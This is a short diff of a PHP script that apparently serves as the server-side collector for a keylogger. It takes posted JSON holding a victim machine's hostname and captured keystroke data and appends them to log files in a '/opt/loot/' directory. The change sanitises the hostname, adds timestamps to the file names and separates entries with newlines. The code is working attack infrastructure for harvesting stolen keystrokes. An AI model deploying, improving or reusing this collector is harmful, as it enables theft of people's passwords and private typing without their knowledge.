@@ -38,11 +38,11 @@ $date = date('dmY_His', time());
 $post_data_raw = file_get_contents('php://input');
 $post_data = json_decode($post_data_raw, true);
 
-$client = getUserIP() . '_keylogged';
-$client_hostname = $post_data['hostname'];
+$client = getUserIP() . "_" . basename($post_data['hostname']);
 
-$file_handle = fopen('/opt/loot/' . $client . '_' . $client_hostname . '.log', 'a');
+$file_handle = fopen('/opt/loot/' . $date . "_" . $client . '_keylogged.log', 'a');
 fwrite($file_handle, $post_data['data']);
+fwrite($file_handle, "\n");
 fclose($file_handle);
 
 ?>
